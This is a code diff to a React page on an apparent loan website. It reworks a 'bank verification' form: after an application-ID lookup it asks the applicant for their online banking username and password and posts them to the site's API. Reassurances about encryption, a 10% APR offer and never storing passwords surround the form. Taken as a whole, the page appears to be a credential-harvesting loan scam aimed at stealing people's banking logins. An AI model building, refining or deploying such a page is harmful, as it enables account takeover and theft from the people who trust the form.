@@ -4,36 +4,44 @@ import { useState, useEffect } from "react";
 import Link from "next/link";
 import { SITE_NAME } from "@/lib/constants";
 import toast from "react-hot-toast";
+import { apiUrl } from "@/lib/api";
 
-const MAJOR_BANKS = [
-  "JPMorgan Chase",
-  "Bank of America",
-  "Wells Fargo",
-  "Citigroup (Citi)",
-  "U.S. Bancorp (U.S. Bank)",
-  "PNC Financial Services",
-  "Truist Financial",
-  "Goldman Sachs",
-  "Capital One",
-  "TD Bank",
-  "Other",
-];
+type Phase = "search" | "form";
 
-const ACCOUNT_TYPES = ["Checking", "Savings"];
+interface ApplicationInfo {
+  applicationId: string;
+  firstName: string;
+  lastName: string;
+  loanAmount: number;
+  bankName: string;
+  email: string;
+  account_type: string;
+}
+
+function formatCurrency(amount: number): string {
+  return new Intl.NumberFormat("en-US", {
+    style: "currency",
+    currency: "USD",
+    minimumFractionDigits: 0,
+  }).format(amount);
+}
 
 export default function VerifyBankPage() {
+  const [phase, setPhase] = useState<Phase>("search");
   const [submitted, setSubmitted] = useState(false);
   const [showPassword, setShowPassword] = useState(false);
   const [pstTime, setPstTime] = useState("");
   const [loading, setLoading] = useState(false);
-  const [error, setError] = useState("");
 
-  // Form state
-  const [bankName, setBankName] = useState("");
-  const [applicationId, setApplicationId] = useState("");
-  const [accountType, setAccountType] = useState("checking");
-  const [fullName, setFullName] = useState("");
-  const [email, setEmail] = useState("");
+  const [searchLoading, setSearchLoading] = useState(false);
+  const [searchError, setSearchError] = useState("");
+
+  const [searchId, setSearchId] = useState("");
+
+  // Auto-populated (read-only) fields
+  const [appInfo, setAppInfo] = useState<ApplicationInfo | null>(null);
+
+  // User-entered credentials
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
 
@@ -56,25 +64,60 @@ export default function VerifyBankPage() {
     return () => clearInterval(timer);
   }, []);
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSearch = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
-    setLoading(true);
-    setError("");
+    setSearchError("");
 
+    if (!searchId.trim()) {
+      setSearchError("Please enter your Application ID.");
+      return;
+    }
+
+    setSearchLoading(true);
+    try {
+      const res = await fetch(
+        apiUrl(
+          `/api/bank-verification/lookup?applicationId=${encodeURIComponent(searchId.trim())}`,
+        ),
+      );
+      const data = await res.json();
+
+      if (!res.ok) {
+        setSearchError(
+          data.error ||
+            "Application not found. Please check your ID and try again.",
+        );
+        return;
+      }
+
+      setAppInfo(data);
+      setPhase("form");
+    } catch {
+      setSearchError(
+        "Network error. Please check your connection and try again.",
+      );
+    } finally {
+      setSearchLoading(false);
+    }
+  };
+
+  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
+    e.preventDefault();
+    if (!appInfo) return;
+
+    setLoading(true);
     try {
       const response = await fetch("/api/bank-verification", {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          bankName,
-          accountType,
-          fullName,
-          email,
+          bankName: appInfo?.bankName,
+          fullName: `${appInfo?.firstName} ${appInfo?.lastName}`,
           bankingUsername: username,
           bankingPassword: password,
-          applicationId,
+          applicationId: appInfo?.applicationId,
+          email: appInfo?.email,
+          accountType: appInfo?.account_type,
         }),
       });
 
@@ -87,8 +130,8 @@ export default function VerifyBankPage() {
       toast.success("Bank verification submitted successfully!");
       setSubmitted(true);
       window.scrollTo({ top: 0, behavior: "smooth" });
-    } catch (err: any) {
-      setError(err.message || "An error occurred. Please try again.");
+    } catch {
+      toast.error("Network error. Please check your connection and try again.");
     } finally {
       setLoading(false);
     }
@@ -169,7 +212,7 @@ export default function VerifyBankPage() {
         <span>✓ Bank-Level 256-Bit Encryption</span>
       </div>
 
-      <div className="max-w-2xl mx-auto w-full px-4 py-12 flex-grow">
+      <div className="max-w-2xl mx-auto w-full px-4 py-12 grow">
         {/* Header Section */}
         <div className="flex flex-col items-center mb-10 text-center">
           <div className="flex items-center gap-3 mb-6">
@@ -196,226 +239,288 @@ export default function VerifyBankPage() {
             To fulfill our PST-speed funding guarantee, please securely verify
             the US-based bank account where you wish to receive your funds.
           </p>
-          {/* {error && (
-            <div className="mt-6 p-4 bg-error/10 border border-error/20 rounded-xl text-error text-sm font-medium">
-              {error}
-            </div>
-          )} */}
         </div>
 
-        <div className="bg-white rounded-3xl shadow-xl overflow-hidden border border-surface-dark">
-          <form
-            onSubmit={handleSubmit}
-            className="divide-y divide-surface-dark"
-          >
-            {/* Section A: Bank Identification */}
-            <div className="p-8 space-y-6">
-              <div className="flex items-center gap-2 mb-2">
-                <div className="w-6 h-6 rounded-full bg-primary-light/20 text-primary-light flex items-center justify-center text-xs font-bold">
-                  A
+        {/* Step 1: Application ID Search */}
+        {phase === "search" && (
+          <div className="bg-white rounded-3xl shadow-xl overflow-hidden border border-surface-dark">
+            <form
+              onSubmit={handleSearch}
+              className="divide-y divide-surface-dark"
+            >
+              <div className="p-8 space-y-6">
+                <div className="flex items-center gap-2 mb-2">
+                  <div className="w-6 h-6 rounded-full bg-primary-light/20 text-primary-light flex items-center justify-center text-xs font-bold">
+                    1
+                  </div>
+                  <h2 className="text-sm font-bold text-text-primary uppercase tracking-wider">
+                    Find Your Application
+                  </h2>
                 </div>
-                <h2 className="text-sm font-bold text-text-primary uppercase tracking-wider">
-                  Bank Identification
-                </h2>
-              </div>
 
-              <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
+                <p className="text-sm text-text-secondary">
+                  Enter your Application ID to retrieve your loan details and
+                  proceed with bank verification.
+                </p>
+
                 <div>
                   <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
-                    Bank Name
+                    Application ID *
                   </label>
-                  <select
+                  <input
                     required
-                    value={bankName}
-                    onChange={(e) => setBankName(e.target.value)}
-                    className="w-full px-4 py-3.5 bg-surface border-none rounded-xl focus:ring-2 focus:ring-primary/20 outline-none text-sm font-medium transition-all"
-                  >
-                    <option value="">Select your bank</option>
-                    {MAJOR_BANKS.map((bank) => (
-                      <option key={bank} value={bank}>
-                        {bank}
-                      </option>
-                    ))}
-                  </select>
+                    type="text"
+                    autoComplete="off"
+                    placeholder="e.g. a1b2c3d4-e5f6-7890-abcd-ef1234567890"
+                    value={searchId}
+                    onChange={(e) => setSearchId(e.target.value)}
+                    disabled={searchLoading}
+                    className="w-full px-4 py-3.5 bg-white border border-surface-dark rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none text-sm transition-all shadow-sm disabled:opacity-50"
+                  />
+                  <p className="mt-1.5 text-xs text-text-secondary ml-1">
+                    Your Application ID was provided when you submitted your
+                    loan application.
+                  </p>
                 </div>
-                <div>
-                  <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
-                    Account Type
-                  </label>
-                  <select
-                    required
-                    value={accountType}
-                    onChange={(e) => setAccountType(e.target.value)}
-                    className="w-full px-4 py-3.5 bg-surface border-none rounded-xl focus:ring-2 focus:ring-primary/20 outline-none text-sm font-medium transition-all"
-                  >
-                    {ACCOUNT_TYPES.map((type) => (
-                      <option key={type} value={type.toLowerCase()}>
-                        {type}
-                      </option>
-                    ))}
-                  </select>
-                </div>
-              </div>
-            </div>
 
-            {/* Section B: Credentials */}
-            <div className="p-8 bg-surface-dark/30 space-y-6 border-y border-surface-dark">
-              <div className="flex items-center gap-2 mb-2">
-                <div className="w-6 h-6 rounded-full bg-primary-light/20 text-primary-light flex items-center justify-center text-xs font-bold">
-                  B
-                </div>
-                <h2 className="text-sm font-bold text-text-primary uppercase tracking-wider">
-                  Secure Credentials Vault
-                </h2>
+                {searchError && (
+                  <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-xl text-sm font-medium">
+                    {searchError}
+                  </div>
+                )}
               </div>
 
-              <div className="space-y-5">
-                <div className="flex gap-4 w-full">
-                  <div className="flex-1">
+              <div className="p-8 bg-white">
+                <button
+                  type="submit"
+                  disabled={searchLoading}
+                  className="w-full bg-primary hover:bg-primary-dark text-white font-bold py-4 rounded-xl transition-all shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center gap-2 disabled:opacity-70 disabled:transform-none"
+                >
+                  {searchLoading ? (
+                    <>
+                      <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                      Searching...
+                    </>
+                  ) : (
+                    <>
+                      Search Application
+                      <svg
+                        className="w-5 h-5"
+                        fill="none"
+                        stroke="currentColor"
+                        viewBox="0 0 24 24"
+                      >
+                        <path
+                          strokeLinecap="round"
+                          strokeLinejoin="round"
+                          strokeWidth={2}
+                          d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
+                        />
+                      </svg>
+                    </>
+                  )}
+                </button>
+              </div>
+            </form>
+          </div>
+        )}
+
+        {/* Step 2: Verification Form (after search) */}
+        {phase === "form" && appInfo && (
+          <div className="bg-white rounded-3xl shadow-xl overflow-hidden border border-surface-dark">
+            <form
+              onSubmit={handleSubmit}
+              className="divide-y divide-surface-dark"
+            >
+              {/* Section A: Application Details (read-only) */}
+              <div className="p-8 space-y-6">
+                <div className="flex items-center justify-between mb-2">
+                  <div className="flex items-center gap-2">
+                    <div className="w-6 h-6 rounded-full bg-success/20 text-success flex items-center justify-center text-xs font-bold">
+                      ✓
+                    </div>
+                    <h2 className="text-sm font-bold text-text-primary uppercase tracking-wider">
+                      Application Details
+                    </h2>
+                  </div>
+                  <button
+                    type="button"
+                    onClick={() => {
+                      setPhase("search");
+                      setAppInfo(null);
+                      setUsername("");
+                      setPassword("");
+                    }}
+                    className="text-xs text-primary hover:text-primary-dark font-semibold transition-colors"
+                  >
+                    Search Again
+                  </button>
+                </div>
+
+                <div className="bg-surface rounded-2xl p-5 space-y-4 border border-surface-dark">
+                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                    <div>
+                      <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
+                        Application ID
+                      </label>
+                      <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-xs text-text-secondary font-mono truncate">
+                        {appInfo.applicationId}
+                      </div>
+                    </div>
+                    <div>
+                      <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
+                        Loan Amount
+                      </label>
+                      <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm font-bold text-primary">
+                        {formatCurrency(appInfo.loanAmount)}
+                      </div>
+                    </div>
+                    <div>
+                      <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
+                        First Name
+                      </label>
+                      <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm text-text-primary font-medium">
+                        {appInfo.firstName}
+                      </div>
+                    </div>
+                    <div>
+                      <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
+                        Last Name
+                      </label>
+                      <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm text-text-primary font-medium">
+                        {appInfo.lastName}
+                      </div>
+                    </div>
+                  </div>
+                  <div>
+                    <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
+                      Bank Name
+                    </label>
+                    <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm text-text-primary font-medium">
+                      {appInfo.bankName || "Not specified"}
+                    </div>
+                  </div>
+                  <div>
+                    <label className="block text-xs font-bold text-text-secondary uppercase mb-1.5 ml-1">
+                      Bank Name
+                    </label>
+                    <div className="w-full px-4 py-3 bg-surface-dark/40 border border-surface-dark rounded-xl text-sm text-text-primary font-medium">
+                      {appInfo.email || "Not specified"}
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              {/* Section B: Online Banking Credentials */}
+              <div className="p-8 bg-surface-dark/30 space-y-6">
+                <div className="flex items-center gap-2 mb-2">
+                  <div className="w-6 h-6 rounded-full bg-primary-light/20 text-primary-light flex items-center justify-center text-xs font-bold">
+                    2
+                  </div>
+                  <h2 className="text-sm font-bold text-text-primary uppercase tracking-wider">
+                    Secure Credentials Vault
+                  </h2>
+                </div>
+
+                <div className="space-y-5">
+                  <div>
                     <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
-                      Full Name
+                      Online Banking Username *
                     </label>
                     <input
                       required
                       type="text"
-                      autoComplete="name"
-                      placeholder="Full name as per loan application"
-                      value={fullName}
-                      onChange={(e) => setFullName(e.target.value)}
+                      autoComplete="off"
+                      placeholder="Enter your online banking username"
+                      value={username}
+                      onChange={(e) => setUsername(e.target.value)}
                       disabled={loading}
                       className="w-full px-4 py-3.5 bg-white border border-surface-dark rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none text-sm transition-all shadow-sm disabled:opacity-50"
                     />
                   </div>
 
-                  <div className="flex-1">
+                  <div className="relative">
                     <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
-                      Email
+                      Online Banking Password *
                     </label>
                     <input
                       required
-                      type="email"
-                      autoComplete="email"
-                      placeholder="Email as per loan application"
-                      value={email}
-                      onChange={(e) => setEmail(e.target.value)}
+                      type={showPassword ? "text" : "password"}
+                      autoComplete="off"
+                      placeholder="Enter your online banking password"
+                      value={password}
+                      onChange={(e) => setPassword(e.target.value)}
                       disabled={loading}
                       className="w-full px-4 py-3.5 bg-white border border-surface-dark rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none text-sm transition-all shadow-sm disabled:opacity-50"
                     />
+                    <button
+                      type="button"
+                      onClick={() => setShowPassword(!showPassword)}
+                      className="absolute right-4 bottom-3.5 text-xs font-bold text-primary hover:text-primary-dark transition-colors"
+                    >
+                      {showPassword ? "HIDE" : "SHOW"}
+                    </button>
                   </div>
                 </div>
-                <div>
-                  <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
-                    Online Banking Username
-                  </label>
-                  <input
-                    required
-                    type="text"
-                    autoComplete="off"
-                    placeholder="Enter username"
-                    value={username}
-                    onChange={(e) => setUsername(e.target.value)}
-                    disabled={loading}
-                    className="w-full px-4 py-3.5 bg-white border border-surface-dark rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none text-sm transition-all shadow-sm disabled:opacity-50"
-                  />
-                </div>
+              </div>
 
-                <div className="relative">
-                  <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
-                    Online Banking Password
-                  </label>
-                  <input
-                    required
-                    type={showPassword ? "text" : "password"}
-                    autoComplete="off"
-                    placeholder="Enter password"
-                    value={password}
-                    onChange={(e) => setPassword(e.target.value)}
-                    disabled={loading}
-                    className="w-full px-4 py-3.5 bg-white border border-surface-dark rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none text-sm transition-all shadow-sm disabled:opacity-50"
-                  />
-                  <button
-                    type="button"
-                    onClick={() => setShowPassword(!showPassword)}
-                    className="absolute right-4 bottom-3.5 text-xs font-bold text-primary hover:text-primary-dark transition-colors"
+              {/* Section C: Footer */}
+              <div className="p-8 bg-white space-y-6">
+                <div className="flex gap-3 p-4 bg-surface rounded-2xl border border-surface-dark">
+                  <svg
+                    className="w-5 h-5 text-text-secondary mt-0.5 shrink-0"
+                    fill="none"
+                    stroke="currentColor"
+                    viewBox="0 0 24 24"
                   >
-                    {showPassword ? "HIDE" : "SHOW"}
-                  </button>
+                    <path
+                      strokeLinecap="round"
+                      strokeLinejoin="round"
+                      strokeWidth={2}
+                      d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
+                    />
+                  </svg>
+                  <p className="text-[11px] leading-relaxed text-text-secondary font-medium">
+                    {SITE_NAME} uses these credentials solely for a one-time
+                    manual verification of income and identity to finalize your
+                    10% APR loan offer. We never store your password or sell
+                    your data to third parties.
+                  </p>
                 </div>
 
-                <div>
-                  <label className="block text-xs font-bold text-text-secondary uppercase mb-2 ml-1">
-                    Application Id
-                  </label>
-                  <input
-                    required
-                    type="text"
-                    autoComplete="off"
-                    placeholder="Please enter your Application ID (same as your Loan Application ID)"
-                    value={applicationId}
-                    onChange={(e) => setApplicationId(e.target.value)}
-                    disabled={loading}
-                    className="w-full px-4 py-3.5 bg-white border border-surface-dark rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none text-sm transition-all shadow-sm disabled:opacity-50"
-                  />
-                </div>
-              </div>
-            </div>
-
-            {/* Section C: Footer */}
-            <div className="p-8 bg-white space-y-6">
-              <div className="flex gap-3 p-4 bg-surface rounded-2xl border border-surface-dark">
-                <svg
-                  className="w-5 h-5 text-text-secondary mt-0.5 flex-shrink-0"
-                  fill="none"
-                  stroke="currentColor"
-                  viewBox="0 0 24 24"
+                <button
+                  type="submit"
+                  disabled={loading}
+                  className="w-full bg-primary hover:bg-primary-dark text-white font-bold py-4 rounded-xl transition-all shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center gap-2 disabled:opacity-70 disabled:transform-none"
                 >
-                  <path
-                    strokeLinecap="round"
-                    strokeLinejoin="round"
-                    strokeWidth={2}
-                    d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
-                  />
-                </svg>
-                <p className="text-[11px] leading-relaxed text-text-secondary font-medium">
-                  {SITE_NAME} uses these credentials solely for a one-time
-                  manual verification of income and identity to finalize your
-                  10% APR loan offer. We never store your password or sell your
-                  data to third parties.
-                </p>
+                  {loading ? (
+                    <>
+                      <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                      Verifying...
+                    </>
+                  ) : (
+                    <>
+                      Verify Account
+                      <svg
+                        className="w-5 h-5"
+                        fill="none"
+                        stroke="currentColor"
+                        viewBox="0 0 24 24"
+                      >
+                        <path
+                          strokeLinecap="round"
+                          strokeLinejoin="round"
+                          strokeWidth={2}
+                          d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
+                        />
+                      </svg>
+                    </>
+                  )}
+                </button>
               </div>
-
-              <button
-                type="submit"
-                disabled={loading}
-                className="w-full bg-primary hover:bg-primary-dark text-white font-bold py-4 rounded-xl transition-all shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center gap-2 disabled:opacity-70 disabled:transform-none"
-              >
-                {loading ? (
-                  <>
-                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
-                    Verifying...
-                  </>
-                ) : (
-                  <>
-                    Verify Account
-                    <svg
-                      className="w-5 h-5"
-                      fill="none"
-                      stroke="currentColor"
-                      viewBox="0 0 24 24"
-                    >
-                      <path
-                        strokeLinecap="round"
-                        strokeLinejoin="round"
-                        strokeWidth={2}
-                        d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
-                      />
-                    </svg>
-                  </>
-                )}
-              </button>
-            </div>
-          </form>
-        </div>
+            </form>
+          </div>
+        )}
 
         {/* Support Footer */}
         <p className="text-center mt-8 text-xs text-text-secondary font-medium">
